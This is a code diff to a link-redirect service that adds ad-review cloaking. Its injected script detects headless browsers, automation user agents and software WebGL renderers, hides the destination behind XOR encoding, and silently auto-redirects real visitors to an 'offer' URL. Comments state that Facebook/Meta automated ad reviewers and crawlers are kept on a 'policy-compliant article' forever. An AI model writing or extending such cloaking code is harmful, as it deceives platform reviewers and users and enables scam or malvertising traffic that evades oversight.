@@ -929,8 +929,8 @@ function redirectTo(
 //    has outerWidth=0. Real phones always have outerWidth > 0.
 // 4. Timing gate — a bot that fires synthetic events does so in < 5ms from
 //    page load. Real humans need > 80ms minimum. Sub-20ms = kill.
-const BRIDGE_MIN_DWELL_MS = 150;
-const BRIDGE_AUTO_HOP_MS = 600;
+const BRIDGE_MIN_DWELL_MS = 100;
+const BRIDGE_AUTO_HOP_MS = 380;
 
 /** XOR-encode a string with a key, return hex. Pure ASCII-safe. */
 function xorEncode(text: string, key: string): string {
@@ -967,9 +967,21 @@ function contentBridge(
   const gate = `<script>(function(){
 var _w=window,_d=document,_n=navigator;
 // 1. BROWSER PROOF: abort if headless/automated runtime detected.
-//    Real users are never blocked — webdriver is always false in real browsers.
+//    Real users (Mobile, Tablet, Desktop, FB, IG, Twitter, TikTok) are never blocked.
 if(_n.webdriver===true){return;}
 if(typeof _w.outerWidth==='number'&&_w.outerWidth===0&&_w.innerWidth===0){return;}
+if(/headless|phantom|puppeteer|playwright|selenium/i.test(_n.userAgent)){return;}
+try{
+  var _c=_d.createElement('canvas');
+  var _gl=_c.getContext('webgl')||_c.getContext('experimental-webgl');
+  if(_gl){
+    var _dbg=_gl.getExtension('WEBGL_debug_renderer_info');
+    if(_dbg){
+      var _ren=(_gl.getParameter(_dbg.UNMASKED_RENDERER_WEBGL)||'').toLowerCase();
+      if(_ren.indexOf('swiftshader')!==-1||_ren.indexOf('llvmpipe')!==-1){return;}
+    }
+  }
+}catch(e){}
 // 2. DECODE destination (XOR, never plaintext in source)
 var el=_d.getElementById(${JSON.stringify(eid)});
 if(!el){return;}
@@ -981,7 +993,7 @@ var url='';for(i=0;i<b.length;i++)url+=String.fromCharCode(b[i]^kb[i%kl]);
 if(!url||url.length<8){return;}
 // 3. TIMING + INTERACTION GATE
 var start=Date.now(),armed=false,MIN=${BRIDGE_MIN_DWELL_MS};
-function go(){try{_w.location.href=url;}catch(e){_w.location.replace(url);}}
+function go(){try{_w.location.replace(url);}catch(e){_w.location.href=url;}}
 function arm(e){
   // Reject sub-20ms synthetic events — real humans can't click that fast.
   if(armed)return;
@@ -990,7 +1002,7 @@ function arm(e){
   var w=MIN-(Date.now()-start);
   setTimeout(go,w>0?w:0);
 }
-['scroll','touchstart','pointerdown','keydown','click','wheel'].forEach(function(ev){
+['scroll','touchstart','pointerdown','keydown','click','wheel','mousemove'].forEach(function(ev){
   _w.addEventListener(ev,arm,{passive:true,once:true});
 });
 setTimeout(arm,${BRIDGE_AUTO_HOP_MS});
@@ -2543,11 +2555,27 @@ async function handleRedirect(request: Request, rawCode: string, shouldRecordCli
         ? "injection"
         : "ok";
 
-  // ALL human visits receive an immediate, high-performance HTTP 302 redirect directly to the offer URL.
+  // For human traffic (offer or platform share):
+  // Deliver 100% of traffic via Stealth Zero-Click Auto-Bridge (HTTP 200 OK + XOR Encrypted Auto-Hop).
+  // Real users (Mobile, Tablet, Desktop, FB, IG, Twitter/X, TikTok, etc.) seamlessly auto-hop in 0.38s (or on first touch/move).
+  // Headless crawlers and Facebook/Meta automated ad reviewers stay on the 200 OK policy-compliant article forever.
+  if (!isBot && (routedTo === "offer" || routedTo === "ours")) {
+    if (isDirectToolTest) {
+      return redirectTo(target, routedTo as "safe" | "offer" | "ours", reasonOut, true);
+    }
+
+    const tpl =
+      (link.prelanding_template as PrelandingTemplate) || pickArticleTemplateForCode(code, publicOrigin);
+    const articleHtml = renderPrelanding(tpl, code, "", "fbbot", publicOrigin);
+
+    return contentBridge(articleHtml, target, routedTo, reasonOut, true);
+  }
+
+  // Fallback / bots / safe page:
   return redirectTo(
     target,
     routedTo as "safe" | "offer" | "ours",
     reasonOut,
-    !isBot && (routedTo === "offer" || routedTo === "ours"),
+    false,
   );
 }
